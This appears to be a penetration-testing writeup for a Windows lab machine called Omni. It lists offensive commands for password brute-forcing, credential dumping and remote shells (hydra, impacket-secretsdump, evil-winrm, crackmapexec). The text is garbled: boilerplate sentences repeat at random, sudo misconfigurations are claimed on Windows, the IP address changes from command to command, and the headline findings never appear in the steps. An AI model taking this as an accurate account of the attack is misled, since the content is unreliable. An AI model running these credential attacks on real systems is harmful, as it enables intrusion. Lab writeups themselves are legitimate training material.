---
TitleSEO: "PwnTillDawn — Omni (Medium Windows) | ZureFX"
TitlePost: "PwnTillDawn — Omni (Medium Windows)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Omni. Subdomain Takeover and Remote File Inclusion to achieve medium compromise on Windows."
Keywords: "tryhackme, pwntilldawn, offsec"
URL: "https://zurefx.github.io/writeups/htb-omni-413.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-omni-413/"
Date: "2024-02-26"
Tags: "TryHackMe, PwnTillDawn, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-omni-413"
Permalink: "/writeups/htb-omni-413.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Omni** is rated **Medium** on PwnTillDawn. It runs **Windows** and the IP address during this analysis was `10.13.174.210`.

### Objectives

Weak file permissions allowed modification of critical system files. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Unconstrained delegation was enabled on the compromised machine.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
gobuster dir -u http://10.106.223.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.114.133.113/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.20.117.92 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

### SMB Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.188.166
evil-winrm -i 10.62.94.169 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. The service was running without proper input validation, leading to injection vulnerabilities. Unconstrained delegation was enabled on the compromised machine.

## Exploitation

### Vulnerability Identification

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Subdomain Takeover**.

The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities.

### Initial Access

Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.97.7.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p53,3306,25 10.69.164.103 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
nmap -sCV -p25,5432,23 10.96.133.187 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.247.73
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. Lateral movement was facilitated by reusing discovered credentials across services.

```powershell
evil-winrm -i 10.109.242.176 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p1521,8888,1433 10.39.2.1 -oN scan.txt
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Summary

### Tools Used

- `evil-winrm`
- `sqlmap`
- `smbexec`
- `sharphound`
- `wpscan`
- `netcat`
- `wmiexec`
- `feroxbuster`

### Key Takeaways

- Subdomain Takeover
- Remote File Inclusion
- SeDebugPrivilege
